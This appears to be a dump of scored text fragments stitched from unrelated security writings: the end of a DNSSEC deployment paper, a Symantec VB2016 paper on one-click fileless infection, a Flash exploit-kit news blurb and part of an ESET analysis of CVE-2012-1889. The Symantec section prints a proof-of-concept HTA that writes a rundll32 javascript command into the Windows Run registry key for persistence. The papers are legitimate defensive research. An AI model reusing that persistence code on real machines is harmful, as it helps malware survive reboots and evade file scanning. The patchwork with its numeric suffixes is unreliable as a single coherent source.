The question of implementing NSEC3 White Lies or not comes down to whether a signature can be computed on the fly. The traditional creation of zone records to be served with DNS resolution happens offline: a set of records is saved into a file format like BIND and used by the live DNS server to answer questions. Having a DNS server with the minimum amount of logic inside allows the operator to conserve CPU resources. In order to do NSEC3 White Lies, the records need to be generated dynamically based on the request. This changes the operational conditions needed to support DNSSEC: the DNS authoritative server itself needs to do the cryptographic operations in response to the incoming query. This demand for live signing imposes several other security problems in distributed environments.",0.02763072044226267
"Key management
As described above, NSEC and NSEC3 were designed for the offline world. A DNS zone is often a static file with all signatures pre-computed on a machine that is not connected to the network. If you remove that requirement and allow cryptographic operations to happen live, you get some valuable tools like NSEC3 White Lies. The downside is that your key material is now live on a machine connected to a network. The main problems with live signing are key security and resource utilization.
Recently, the world was shocked by a bug known as Heartbleed that opened up a major security hole in server applications. It was caused by a coding error in OpenSSL that exposed a remote memory disclosure vulnerability. By sending a carefully constructed packet to a server that uses a version of OpenSSL with the flaw, an attacker could reveal server memory. In particular, it is possible to extract the TLS private key from the server without a lot of effort. Heartbleed-style bugs are just one of the many threats to private key security when the key is being used in an active process. The more a machine is exposed to the Internet, the more vectors of attack there are. Offline signing machines have a much smaller window of exposure to threats.
One way to keep keys secure is to use a hardware-backed solution such as a hardware security module (HSM). One of the major drawbacks for this is cost – HSMs are very expensive. This is one of the stickiest points for running DNS servers that are spread out geographically in order to be close to their customers. Running an HSM in every server location can not only be expensive, but there can be legal complications as well [7].",0.017277297399144742
"Reflection/amplification threat
Another fear for operators running an authoritative DNS server is that they will be used as a vehicle for malicious distributed denial of server (DDoS) attacks. This stems from the fact that DNS uses UDP, a stateless protocol.
In TCP, each connection begins with a three-way handshake. This ensures that the IP address of both parties is known and correct before starting a connection. In UDP, there is no such handshake, messages are just sent directly to an IP with an unverified ‘from’ IP address. If an attacker can craft a UDP packet that says ‘hi, from IP X’ to a server, the server will typically respond by sending a UDP packet to X. Choosing X as a victim’s IP address instead of the sender’s is called UDP ‘spoofing’. By spoofing a victim, an attacker can cause a server that responds to UDP requests to flood the victim with ‘reflected’ traffic.
DNSSEC also works over UDP, and the answers to DNS queries can be very long, containing multiple DNSKEY and RRSIG records. This is a big target for attackers since it allows them to ‘amplify’ their reflection attacks. If a small volume of spoofed UDP DNSSEC requests is sent to a nameserver, the victim will receive a large volume of reflected traffic. Sometimes this is enough to overwhelm the victim’s server, and cause a denial of service.
Like many services, DNS can also work over TCP. There is a flag called the ‘truncation’ flag that can be sent back to a resolver to indicate that TCP is required. This would fix the issue of DNS reflection at the cost of slower DNS requests. This solution is not practical at the moment since 16% of resolvers don’t respect the TCP truncation flag, and 4% don’t try a second server [8]. TCP is not the solution at the moment. Using resource rate limiting and using proper heuristics into servers seems to be the best way to mitigate this threat at the moment.",0.018819393728031875
"Valuable extensions
The security provided by DNSSEC is helpful for securing regular DNS records against poisoning attacks or other malicious manipulation. Having a secure root of trust is also useful for securing other systems. One interesting application of this is providing an alternative root of trust for the standard web PKI.
Websites are typically secured through a mechanism called Transport Layer Security (TLS). When a browser accesses a site over the HTTPS protocol, the web server authenticates itself to the client using its TLS certificate and the two parties establish a shared key for further encrypted communication. In order to prove authenticity of the server’s certificate, it is digitally signed by a third party known as a Certificate Authority (CA). To ensure that the site is who it says it is, the browser validates the site’s certificate against the domain name of the site and ensures that the certificate authority that was used to sign the certificate is trusted.
Different browsers on different platforms have different lists of CAs that they trust. For example, Windows 8.1 trusts 227 so called root certificates, and Firefox (version 30) only trusts 143 certificates. One of the main criticisms of web PKI is that there are too many trusted certificate authorities. In 2011, a CA called TURKTRUST mis-issued an intermediate certificate [9] that allowed rogue entities to create certificates that were valid for google.com and other high-profile web domains [10]. In the same year, another CA called Diginotar was found to have been compromised by attackers [11]. Clearly trusting so many different entities is dangerous for web browsing.
Enter DANE (DNS-based Authentication of Named Entities), an extension of TLS that allows a website owner to embed its TLS certificate into the DNS. With DNSSEC signatures used to validate the correctness of the certificate, it is no longer necessary for the browser to trust the CA, they can trust DNS instead. With one heavily protected root of trust, website identities are much more difficult to subvert.
Defined in RFC 6698 [12], DANE adds a new resource record to DNS: TLSA. This new record can be used to indicate the expected certificate for a given domain, or identify which CA should be expected as the root of trust for the certificate. If DANE had been implemented and validated by browsers during the TURKTRUST incident, attackers would not have been able to spoof google.com because they not only had a new certificate, but the one presented was signed by the wrong certificate authority (google.com’s certificate is signed by GeoTrust).",0.025269152708918274
"Deployment statistics
It has been more than nine years since the publication of the DNSSEC RFCs and, needless to say, deployment is far from complete. There are many different components involved. We will summarize the progress in each of the following areas:
Signing the root zone
Signing the TLD zones
Registrar integration
Validating resolvers",0.013838172619713318
"Signing the root
The first step in getting DNSSEC to work is signing the root. This is the most important piece of DNSSEC as this key forms the root of trust for the entire system.
ICANN has specified a set of instructions for managing the root keys and signing the root zone [13]. This is called a key ceremony and involves many of the original creators of the Internet. The first root zone keys were published on 15 July 2010, just after the first and second key-signing ceremonies.",0.02012011136780445
"Signing the TLDs
After the signature of the DNS root zone, the next step is signing and managing the keys for the various top level domains (.com, .net, .gov, etc.). The first generic TLD (gTLD) to be signed was .org in June 2009 [14]. As of 29 June 2014, 445 out of 630 TLDs in the root zone are signed [15]. The full list has been visualized by .se’s DNSCHECK tool [16].
Figure 1 shows the number of TLDs that have registered their keys with the root [17]. There was a large increase starting in late 2013 when many more gTLDs were added, all of which were required to implement DNSSEC from the outset [18].
Figure 1. Number of TLDs that have registered their keys with the root.
(Click here to view a larger version of Figure 1.)
Recently, the TLD for the European Union, .eu, presented the history of its deployment of DNSSEC [19]. The .eu registry started accepting DNSKEY material in June 2010, and got the .eu KSK’s DS record signed by the root in September 2010. By May 2014, 267,000 of 3,840,000 (6.9%) .eu zones had been signed. The progress is shown in Figure 2.
Figure 2. Progress of .eu domain signing.
(Click here to view a larger version of Figure 2.)
Another large TLD with DNSSEC enabled is .cn [20], which updated its zone’s DS in the root in September 2013 and became fully operational in December of that year. For this zone, the keys are kept by five key administrators who are each given a smart card containing a segment of the keys. The full key can be constructed from any three of the five segments.
The process is still young, and each TLD is developing its own set of standards and practices. ICANN has published RFC 4641 [21] to help explain and standardize the process, including expiration and validity periods for keys. For the .cn keys, the following approach was taken:
ZSK: RSA-SHA256 1024-bit, NSEC3
KSK: RSA-SHA256 2048-bit, NSEC3
Key rotation cycle:
ZSK: 100 days, RRSIG period: 30 days
KSK: 13 months, RRSIG period: 30 days
Going back to 2012, DNSSEC deployment was much less advanced [22], only 86/313 TLDs were signed. As shown in Figure 3, adoption is continuing at steady rate, surpassing 350,000 .com domains in 2014 [23]. It should be noted that this accounts for less than 0.5% of domains in either the .com or .net zones, as Figure 4 shows [24].
Figure 3. DNSSEC adopion continues at a steady rate – surpassing 350,000 .com domains in 2014.
(Click here to view a larger version of Figure 3.)
Figure 4. Less than 0.5% of domains in either the .com or .net zones are accounted for.
(Click here to view a larger version of Figure 4.)",0.023433489052521628
"Registrar integration
Part of the DNSSEC process for domains is getting their DS record into the proper TLD zone and signed. The KSK can be created and added to a zone, but without a DS record there is no way for resolvers to validate or connect the signatures to the root. This is handled by the site’s registrar.
As of 27 May 2014, 35 registrars can accept DS records. This includes many leading registrars such as GoDaddy, DYN and OVH. Several of these registrars also handle signing services if needed. A full list is provided by ICANN [25]. As of 2013, all new registrar applicants are required to support DNSSEC [26].",0.016618602511806246
"Validating resolvers
Even with all of the root, TLD, and authoritative servers serving valid DNSSEC records, they need to be validated by resolvers to have any weight.
Comcast was one of the first major services to validate DNSSEC records by default. All of Comcast’s domains were signed and customer DNSSEC validation was turned on in January 2012 [27]. Google Public DNS is another popular DNS resolver service that started validating DNSSEC responses by default on 6 May 2013[28].",0.019259764095158505
"Conclusions
DNSSEC is a valuable tool for improving the trust and integrity of DNS, the backbone of the modern Internet. DNSSEC deployment is still in its infancy, less than five per cent of all zones had been signed as of mid-2014. Though is has its detractors, adoption is increasing and DNSSEC is becoming a core tool in the development of a safer and more trustworthy Internet.",0.017504041911966528
"Bibliography
[1] https://kb.isc.org/article/AA-00924/0/CVE-2008-1447%3A-DNS-Cache-Poisoning-Issue-Kaminsky-bug.html.
[2] http://www.iana.org/domains/root/servers.
[3] http://www.zoneedit.com/doc/rfc/.
[4] http://spectrum.ieee.org/images/oct08/images/phish03.pdf.
[5] http://nmap.org/nsedoc/scripts/dns-nsec3-enum.html.
[6] http://dankaminsky.com/2011/01/05/djb-ccc/#whitelies.
[7] http://www.kslaw.com/imageserver/KSPublic/library/publication/2011articles/ 11-11WorldECRCloutierCohen.pdf.
[8] http://www.circleid.com/posts/20130820_a_question_of_dns_protocols/.
[9] http://nakedsecurity.sophos.com/2013/01/08/the-turktrust-ssl-certificate-fiasco-what-happenedand-what-happens-next/.
[10] https://krebsonsecurity.com/2013/01/turkish-registrar-enabled-phishers-to-spoof-google/.
[11] http://threatpost.com/final-report-diginotar-hack-shows-total-compromise-caservers-103112/77170.
[12] http://tools.ietf.org/html/rfc6698.
[13] http://www.root-dnssec.org/wp-content/uploads/2010/02/draft-icann-dnssec-ceremonies-00.txt.
[14] http://www.circleid.com/posts/20090602_org_first_open_top_level_domain_dnssec/.
[15] http://stats.research.icann.org/dns/tld_report/.
[16] http://tldwithdnssecandipv6.se/.
[17] http://rick.eng.br/dnssecstat/.
[18] https://www.dnssec-deployment.org/index.php/2012/01/new-gtlds-will-support-dnssec-fromthe-start/.
[19] https://london50.icann.org/en/schedule/wed-dnssec/presentation-dnssec-eu-25jun14-en.
[20] http://www.apirc.org/previous/2013/wjxz/201309/P020130930491213318448.pdf.
[21] http://www.ietf.org/rfc/rfc4641.txt.
[22] https://www.icann.org/en/system/files/files/menog-dnssec-deployment-30apr12-en.pdf.
[23] http://scoreboard.verisignlabs.com/count-trace.png.
[24] http://scoreboard.verisignlabs.com/percent-trace.png.
[25] https://www.icann.org/resources/pages/deployment-2012-02-25-en.
[26] http://www.internetsociety.org/deploy360/blog/2013/09/icanns-2013-raa-requires-domainname-registrars-to-support-dnssec-ipv6/.
[27] http://www.internetsociety.org/deploy360/resources/case-study-comcasts-dnssecimplementation/.
[28] https://groups.google.com/forum/?hl=en#!topic/public-dns-announce/67oxFjSLeUM.
",0.013582391732190557
VB2016 paper: One-click fileless infection,0.007973574572682107
Himanshu Anand & Chastine Menrige,0.012014657765652359
"Symantec, India",0.00920163334663826
Copyright © 2016 Virus Bulletin,0.009767502707145992
"Table of contents
Abstract Introduction Early examples How it works Notable malware that use this technique Poweliks Bedep Kotver Fileless forecast MSHTA.EXE HTA So why don't users just use an HTML file? Security considerations One-click fileless infection In-memory infection Proof of concept Variants Prevention and mitigation Manual removal AV solutions References",0.012311910182905117
Abstract,0.009485057568311417
"Since last year, there has been growing interest in a technique known as fileless infection, where malware authors compromise computers without writing any files to disk. This technique allows the threat to evade detection by file-scanning software while still remaining persistent.",0.011753822511719858
"This paper will explain the different fileless infection methods, as well as a new tactic that could allow attackers to perform fileless infection through a classic one-click fraud attack using non-PE files.",0.015770929677577872
"Traditional malware is contained in a file on disk. A registry run key links to this file in order to make the threat persistent. With fileless infection, the malware does not exist on the compromised computer as a normal file. Instead, it is located in a subkey within the computer's registry as a script, such as Windows PowerShell, VBScript, or JavaScript. The payload in the registry is called every time Windows starts.",0.010963037427574096
"The one-click fileless infection technique we've seen uses JavaScript, though different scripts could also work. The infection arrives on the computer through an .hta file, which places the JavaScript payload into a registry subkey. The JavaScript code can be triggered every time Windows starts by calling the following:",0.015950145237684343
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";alert('payload');",0.010132122852892333
"The JavaScript code can read and decode encoded data from another subkey. This data injects the payload into memory. Every few minutes, the payload checks for its registry entry. If the entry has been deleted, the payload recreates it so that the infection remains persistent.",0.010695053309312863
"The first widespread threat we saw using the fileless infection technique was Trojan.Poweliks [1] in 2014. Many other trojans followed suit as they evolved, just two of which are Trojan.Bedep [2] and Trojan.Kotver [3].",0.013865986347596393
Our paper will explain and compare the most common ways in which malware authors use fileless infections today. We will discuss areas where we expect these methods to be used in the near future.,0.015009577943957297
Introduction,0.012036720276026314
"Traditionally, AV products detect malicious files using strings or code signatures found in the file. Malware has several ways to avoid being detected, one of which is to put only the malicious code in memory. One example is Korplug, where the infection chain includes the decryption of an encrypted file, which is an executable file loaded in memory [4]. It does this so that the code is protected when an AV product scans the file. A fileless type of infection does this on a different level – there is no longer a file written to disk for the AV product to scan. Even if the file is not on the disk, the malware must still have a persistence mechanism.",0.016011782603243208
Early examples,0.009095468349490266
"The first fileless malware that caught the attention of researchers is Trojan.Poweliks, discovered in 2014. Poweliks does not exist as a file on a disk, but instead resides in the registry, which it only uses as a persistence mechanism [5]. Poweliks uses a special naming scheme to hide in the registry and has consistently used CLSID hijacking as runtime load point in the registry. Later on, Poweliks was also observed exploiting the Microsoft Windows Remote Privilege Escalation Vulnerability (CVE-2015-0016) [6] in order to take control of compromised sites. At the same time, another fileless malware, Trojan.Bedep, was also using the same zero-day exploit. Bedep is an in-memory-only downloader and perceived to have a similar coding style to Poweliks. Trojans like Trojan.Bedep and Trojan.Kotver have learned from Poweliks and adopted the same technique.",0.018320089769239933
How it works,0.008775160658191838
"Typically, fileless malware arrives through exploit kits (EK) when a user visits a compromised site. The Angler exploit kit was the very first EK observed to infect a host without writing the malware on the drive [7]. The shellcode delivered by Angler is responsible for injecting the fileless malware into the process running the exploited plug-in, such as iexplore.exe. Fileless malware may also arrive through malicious file attachments or malicious URL links found in spammed emails. These are usually downloader malware, which are first written over the disk but eventually delete themselves after injecting the fileless malware into memory.",0.016152164373901434
Figure 1: Infection chain of fileless threat.,0.020078629877493204
"Once injected into the memory, the malware loads and encrypts a binary component. This obfuscated copy is saved in the registry and then another entry is created. This contains the script as part of its autostart mechanism. This script can be either VBScript, JavaScript or PowerShell script, and is responsible for decrypting the binary component and loading it into the memory.",0.01197052142367927
"The binary component is then launched and serves as a watchdog – it monitors the relevant registry entries it created and is also responsible for contacting the malicious command and control (C&C) server. Back door capabilities of this malware may include reinstalling registry entries, downloading and executing files, and calling other commands. One of the files it downloads and executes can install an ad-click module into memory.",0.014485893299281072
Notable malware that use this technique,0.007374388895705297
Poweliks,0.008100605759135182
"From the file-based malware known as Wowliks, Trojan.Poweliks evolved into a registry-based malware. One of its notable behaviours is downloading a PowerShell application, hence the name Poweliks. This malware uses PowerShell scripts to launch and inject its DLL watchdog from the registry entry into the DLLHost.exe process to retain its persistence mechanism. The main payload of Poweliks is to deliver ad-fraud trojans and ransomware to the infected user.",0.01048671045996119
Bedep,0.007981330304682177
"Trojan.Bedep is believed to have a connection to Poweliks due to similarities in coding style and the use of the same CVE-2015-0016 exploit, but there is no conclusive evidence linking the authors of the two pieces of malware. Bedep has been observed to download and install Poweliks along with other ad-fraud malware. Bedep comes in 32-bit and 64-bit variants and uses Microsoft properties for its own file properties as part of its disguise. The main purpose of this malware is to turn the compromised computers into botnets.",0.015102537448553832
Kotver,0.007823231320080448
"Prior to adopting Poweliks's fileless infection technique, variants of the Kotver malware were residing only in the registry to evade detection. However, it does not fully embrace the fileless infection technique. Like Poweliks, it downloads a PowerShell application, but if no Internet connection is available, it reverts to file-based infection and creates a copy of itself on the disk. Kotver has been observed to deliver ransomware and banking trojans.",0.014078982236225834
Fileless forecast,0.008634720809106544
"There has been growing interest in fileless infections over the last couple of years. Earlier, we explained the different infection vectors used by different actors. Now, we will discuss a new infection vector, which can potentially be used for performing fileless infections with non-PE files, using a classic one-click fraud attack method [8].",0.01265543096757693
"First, we will discuss all the individual components one by one, making it easy to understand one-click fileless infection.",0.016277380727460766
MSHTA.EXE,0.00867168752464409
This program is an implementation of the WebBrowser control that runs trusted HTML and scripts with a minimal user interface (UI).,0.008772329656489886
HTA,0.007917302893630018
"As technology improves and grows with time, some of it does deprecate. In Windows OS, one such powerful technology has existed since Windows NT (released in July 1993) and is still present in Windows 10 (released in July 2015): HTML Application (HTA).",0.01582560530629329
"HTA [9] is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer (IE), such as VBScript or JScript. The HTML is used to generate the user interface, and the scripting language is used for the program logic. An HTA executes without the constraints of the Internet browser security model; in fact, it executes as a 'fully trusted' application. The usual file extension of an HTA is .hta.",0.009818074076884509
"All the current Windows OSes support HTA file execution. HTA looks and behaves like an HTML file, but it has much higher privileges than an HTML file. An HTA file requires mshta.exe, which comes along with Internet Explorer. Mshta.exe executes the HTA by instantiating the Internet Explorer rendering engine (mshtml) as well as any required language engines (such as vbscript.dll).",0.017018055049686565
"HTAs provide a way for users to wrap scripts up in a graphical user interface (GUI), an interface replete with check boxes, radio buttons, drop-down lists, and other Windows elements.",0.011310892313818988
"For our purposes, an HTA is nothing more than a way to provide a GUI for scripts. As we have already noted, neither WSH nor VBScript provides much in the way of GUI elements: no check boxes, no list boxes, nothing. Internet Explorer, however, makes use of all of these elements and more. Because an HTA leverages IE, a user can take advantage of all these GUI elements when writing system administration scripts.",0.016814124615865622
"How closely related are HTML files and HTAs? All a user has to do is take any HTML file and change the file extension from .htm (or .html) to .hta, and just like that, the file is now an HTA.",0.013155245746436117
Figure 2: General IE architecture and applications [10].,0.007768781312484485
So why don't users just use an HTML file?,0.010649800739487958
"The very simple answer is: security. There are a lot of security restrictions implemented on IE, and for good reason: if users visit a website they would probably prefer that the site does not use a client-side script that starts reconfiguring their settings or rooting around in their file system. Consequently, many system administration scripts – including those that use WMI or ADSI – either will fail when run from IE or, at best, will display a dialog box similar to the following:",0.012013017544384663
Figure 3: A dialog box is displayed whenever users run scripts from an HTML file.,0.012350479334160891
"Whenever users run scripts from an HTML file they are presented with a dialog box like this. That might be okay, but it is definitely not the best possible user experience.",0.011302160472000944
"HTAs, by contrast, are not bound by the same security restrictions as IE, because HTAs run in a different process from IE. HTAs run in the mshta.exe process rather than the iexplore.exe process. Unlike HTML pages, HTAs can run client‑side scripts and they have access to the file system. Among other things, this means that HTAs can run users' system administration scripts, including those that use WMI and ADSI. The users' scripts will run just fine, and they will not receive any warnings about items that might be unsafe.",0.01440392966354953
"Of course, this does not mean that HTAs somehow bypass Windows security. For example, if one user does not have the right to change another user's password, then the former cannot use a script to change the latter's password. Placing that script in an HTA will not make a difference – the user still will not be able to change the other user's password. HTAs also have some security restrictions of their own.",0.013440273854062768
"The long and the short of it is that, although HTAs use Internet Explorer and the IE object model, they run in a different process from IE. Consequently, users can run scripts and perform other tasks that are not allowed in IE.",0.011233888673467418
More information about HTAs and security can be found on the HTML Applications SDK page [11] on the Microsoft Developer Network (MSDN).,0.011447387714450752
Security considerations,0.008089166120210933
"When a regular HTML file is executed, the execution is confined to the security model of the web browser – that is, it is confined to communicating with the server, manipulating the page's object model (usually to validate forms and/or create interesting visual effects) and reading or writing cookies.",0.010709123083629812
"On the other hand, an HTA runs as a fully trusted application and therefore has more privileges than a normal HTML file; for example, an HTA can create, edit and remove files and registry entries. Although HTAs run in this 'trusted' environment, querying Active Directory can be subject to Internet Explorer Zone logic and associated error messages.",0.010376713318269726
One-click fileless infection,0.007418220552080523
"After analysing file infections and their infection vectors, we discovered that infections are also possible if attackers use non-PE files and a very well-known infection vector: one-click fraud.",0.014148948937414585
"One-click fraud is not new; it has existed for over a decade and has been seen affecting mostly Asian countries, most notably Japan. Typically, one-click fraudsters attempt to trick users into subscribing to bogus adult video services with a single click, although variants requiring two, three, and four clicks – even zero clicks – have also been observed [12]. One-click fraud exhibits ransomware-like behaviour, in that it attempts to lock the user's screen and create non-terminating or recurring pop-up windows, which ask the user to register, subscribe, or pay a certain amount to remove them.",0.020236698912550533
We found that malicious actors could potentially mix fileless infection and one-click fraud to create one-click fileless infection. In a nutshell:,0.016555136956064365
Fileless infection + one-click fraud = One-click fileless infection,0.009262861159794245
In-memory infection,0.006842270677403728
We used an HTA file to create an ActiveX object that could inject the JS payload into a Run registry entry. We found that the same can be achieved using PowerShell and WSCRIPT (VBS).,0.011775935776838109
Figure 4: How the attack works.,0.018753074835727412
Proof of concept,0.009025029068720158
"The code shown in Figure 5 is for the HTA file, which could be hosted on an attacker's controlled server. In an infection scenario, the user is enticed to visit the website (using social engineering or a watering hole attack), and then asked to click Run/Execute. Once executed, the file creates a WScript ActiveX object, which then creates the Run registry entry and injects it with a JS alert (for POC) which is executed using rundll32.",0.015253151218897365
"/****************************POC*********************************************/
<html>
<head>
<title>RegTest</title>
<script language=""JavaScript"">
function writeInRegistry(sRegEntry, sRegValue)
{
var regpath = ""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"" + sRegEntry;
var oWSS = new ActiveXObject(""WScript.Shell"");
oWSS.RegWrite(regpath, sRegValue, ""REG_SZ"");
}
function readFromRegistry(sRegEntry)
{
var regpath = ""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"" + sRegEntry;        /*Payload injected in Run registry entry*/
var oWSS = new ActiveXObject(""WScript.Shell"");    /*WASCRIPT ActiveX object created which is used to inject the Malicous JS in registry*/
return oWSS.RegRead(regpath);
}
function tst()
{
writeInRegistry(""malware"", ""rundll32.exe javascript:\""\\..\\mshtml,RunHTMLApplication \"";alert('payload'); ""); /*Payload is the JS payload which does the real malicious stuff and it got watchdog, for keeping an eye over the registry entry which makes the infection persistent*/
alert(readFromRegistry(""malware""));
}
</script></head>
<body>
Click here to run test: <input type=""button"" value=""Run"" onclick=""tst()""
</body>
</html>
/***************************POC end*****************************************/",0.016756318808740067
Figure 5: Proof of concept.,0.01818459665634875
"For our purposes, we picked the case of Poweliks, specifically because of how it extracts the JS from the Run registry entry. It is injected into the Run registry entry to make the infection persistent. Once the user restarts the computer, it reinjects itself, as in-memory infection will disappear once the computer is restarted.",0.008799048926255715
"For our POC, we used the Alert API, although malicious actors may choose differently. As in previous cases of fileless infection, we found that it features a watchdog module, which keeps an eye over the registry entry. It also recreates the registry entry if the user deletes it.",0.014002503870753302
"For simplicity, we have only shown how to execute the code. The same thing can be achieved using PowerShell or CSCRIPT.",0.009563181655785624
"This attack may affect all Windows versions from Windows 95 through to Windows 10. All versions have IE preinstalled, which, as previously discussed, comes with WSCRIPT, which is the only required component to perform this attack.",0.011602887669201145
Variants,0.008863966025098535
Other variants of similar attacks can be made using the following trusted applications:,0.010650219957897833
"PowerShell [
13
]",0.007861441098143573
"CSCRIPT [
14
]",0.011623205031064843
"WSCRIPT [
15
]",0.008672874301200673
Prevention and mitigation,0.007723985036590664
Symantec recommends users adhere to the following best practices to prevent one-click fileless infection:,0.009483799872942233
Never treat HTA files as HTML files,0.008883794429673797
"Dynamically detect orphan registry entries that call PowerShell, WSCRIPT, CSCRIPT, cmd, RUNDLL32, or regserve32",0.012396608851229618
Perform manual removal where necessary (steps are outlined below).,0.023581451156203692
Manual removal,0.008909678676337962
"Download and execute
Microsoft
's
Process Explorer
.",0.009553012690181384
Restart in Safe Mode.,0.015360370987853256
Select the mother process (into which the malware is injecting) and terminate it (kill Process Tree).,0.015435556025011676
Open Registry Editor (Run -> regedit.exe).,0.012348990279425709
"In the left panel, go to: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",0.02857134518604776
Clean registry entries.,0.016365850325001485
Close Registry Editor.,0.01696621223492767
AV solutions,0.008074034969684729
Anti-virus products have the following approaches to address fileless infections:,0.010825194716925113
Memory scanning,0.007421543489444682
Registry scanning,0.007803805201245684
Network scanning.,0.01619532317691097
References,0.0158494738281566
[1] Trojan.Poweliks. https://www.symantec.com/security_response/writeup.jsp?docid=2014-080408-5614-99.,0.009844202649423539
[2] Trojan.Bedep. https://www.symantec.com/security_response/writeup.jsp?docid=2015-020903-0718-99.,0.010484863348425133
[3] Trojan.Kotver. https://www.symantec.com/security_response/writeup.jsp?docid=2015-082817-0932-99.,0.010758958545158404
"[4] Camba, A. Unplugging Plugx Capabilities. Trend Micro Malware Blog. http://blog.trendmicro.com/trendlabs-security-intelligence/unplugging-plugx-capabilities.",0.011060881910135989
"[5] O'Murchu, L.; Gutierrez, F. The evolution of the fileless click-fraud malware Poweliks. Symantec Connect Blog. http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/evolution-of-poweliks.pdf.",0.01269290922255506
[6] Microsoft Windows Remote Privilege Escalation Vulnerability (CVE-2015-0016). https://www.symantec.com/security_response/vulnerability.jsp?bid=71965.,0.011824247477087213
"[7] Kafeine. Angler EK: now capable of ""fileless"" infection. Malware Don't Need Coffee Blog. http://malware.dontneedcoffee.com/2014/08/angler-ek-now-capable-of-fileless.html.",0.01295496251743189
"[8] Anand, H. One-click fraudsters extend reach by learning Chinese. Symantec Connect Blog. http://www.symantec.com/connect/blogs/one-click-fraudsters-extend-reach-learning-chinese.",0.014454272934962265
[9] Extreme Makeover: Wrap Your Scripts Up in a GUI Interface. Microsoft Technet. https://technet.microsoft.com/en-us/library/ee692768.aspx.,0.013426904932497541
[10] Recreated from the Microsoft TechNet (2013) gallery – IE Architecture. https://gallery.technet.microsoft.com/IE-Architecture-3bc7c3fd/file/78635/1/IE%20Architecture.png.,0.012647012282466896
[11] HTML Applications SDK. https://msdn.microsoft.com/en-us/library/ms536473(vs.85).aspx.,0.012491053369285798
"[12] Hamada, J. The rise of Japanese zero-click fraud. Symantec Connect Blog. http://www.symantec.com/connect/blogs/rise-japanese-zero-click-fraud.",0.01579420541784904
[13] It's a Wrap! Windows PowerShell 1.0 Released! Windows PowerShell Blog. https://blogs.msdn.microsoft.com/powershell/2006/11/14/its-a-wrap-windows-powershell-1-0-released.,0.01214052682691813
[14] Using the command-based script host (CScript.exe). Microsoft Technet. https://technet.microsoft.com/en-us/library/bb490887.aspx.,0.010870304626235616
"[15] WScript Object. Microsoft Developer Network. https://msdn.microsoft.com/en-us/library/at5ydy31(v=vs.84).aspx.
",0.011112259827176119
"Recent Flash Zero-Day Now Part of Exploit Kits
The Adobe Flash Player continues to be the favourite browser plugin threat actors have been focusing on this year. The recent zero-day exploit that was used in targeted attacks is now part of mainstream exploit kits.
Angler EK and Nuclear EK now include the latest CVE-2015-7645 which was patched by Adobe on October 16. This vulnerability affects Adobe Flash up to version 19.0.0.207.
This slideshow requires JavaScript.
Both Exploit Kits are blocked by Malwarebytes Anti-Exploit before they even have the chance to unleash their malicious payload.
Because Flash has been such a hot target this year, it is recommended to either disable it or remove it entirely.
People that choose to keep it should always ensure they are running the latest version but also run an exploit mitigation tool in parallel to account for zero-days.
",0.011794425848988155
"CVE2012‑1889: MSXML use‑after‑free vulnerability
As soon as Microsoft had released patches for security bulletin MS12-037 (which patched 13 vulnerabilities for Internet Explorer) Google published information (Microsoft XML vulnerability under active exploitation) about a new zero-day vulnerability (CVE-2012-1889) in Microsoft XML Core Services. Sometimes vulnerabilities are discovered at a rate that outpaces the patching process and so a temporary fix",0.011981731756509295
20 Jun 2012 - 09:58AM,0.011277002657915425
As soon as Microsoft had released patches for security bulletin MS12-037 (which patched 13 vulnerabilities for Internet Explorer) Google published information (Microsoft XML vulnerability under active exploitation) about a new zero-day vulnerability (CVE-2012-1889) in Microsoft XML Core Services. Sometimes vulnerabilities are discovered at a rate that outpaces the patching process and so a temporary fix,0.01242134318700261
As soon as Microsoft had released patches for security bulletin MS12-037 (which patched 13 vulnerabilities for Internet Explorer) Google published information (Microsoft XML vulnerability under active exploitation) about a new zero-day vulnerability (CVE-2012-1889) in Microsoft XML Core Services. Sometimes vulnerabilities are discovered at a rate that outpaces the patching process and so a temporary fix is needed. That is what Microsoft has provided in this case: a ‘Fix it’ patch. We recommend that you install the patch because exploits for the vulnerability are already in the wild.,0.010207802785850872
"Furthermore, a few days ago an exploit for CVE-2012-1889 was made public through publication in the Metasploit Framework repository (New Critical Microsoft IE Zero-Day Exploits in Metasploit). ESET products already detect the CVE-2012-1889 vulnerability as JS/Exploit.CVE-2012-1889. However, you should still install the patch if you are using software that is affected, as detailed in Microsoft Security Advisory 2719615.",0.013694910538384564
"Now for the technical details: CVE-2012-1889 exploits memory corruption issues in Microsoft XML Core Services when trying to access an XML Node that hasn’t been initialized, using the get_definition API call, which may corrupt memory and allow remote code execution. The ‘Use-after-free’ class of vulnerability is quite commonly found in programs developed in the C/C++ languages.",0.008201853242028712
Vulnerability CVE-2012-1889 is simple to exploit in all known versions of Internet Explorer. An attacker can make a CLSID-identification request by calling MSXML library methods and create an object identifier in order to try to access a non-existent object. Proof of Concept code for causing a crash looks like this:,0.007675525003911887
Figure 1,0.009256589686127414
"This code looks simple, but generates memory corruption and crashes Internet Explorer. The exploitation code tries to request a non-initialized object, but reference to memory region already exists. Memory corruption takes place in the helper function _dispatchImpl :: InvokeHelper() in the MSXML library. It’s possible to execute remote code on execution of the following instruction:",0.010861117854036983
call    dword ptr [ecx+18h],0.010334007516564325
So if an attacker modifies stack values this code transfers control to the shellcode. In order to modify the stack attackers can use a heap-spray technique and as result can control execution process according to the following steps.,0.013953649657490907
Figure 2,0.009290671026901842
Figure 3 demonstrates backtrace of all stack frames after Internet Explorer crashes:,0.008359840885599601
Figure 3,0.00968249909308827
On the stack it is possible to track the moment at which the XML Node object is handled:,0.008192497152607503
Figure 4,0.009463462951553425
"At the next step of execution the shellcode receives control and is executed, and as a result it is possible to effect malicious operations on the affected machine.",0.01278121400442378
Figure 5,0.009202338681560729
"Of course on Windows 7 or Vista attackers need to bypass ASLR, DEP and other security mechanisms built into the operating system. But in the lab we already have many examples of real exploits that can make use of this mechanism, and there is no universal method of stopping attackers at this moment. What is worse, there are ways in which it is possible for an exploit to make use of .DOC files: the known affected Microsoft Office versions are 2003/2007. We strongly recommend that you install the ‘Fix it patch’ on the system so as to mitigate this attack vector.",0.010981940654026578
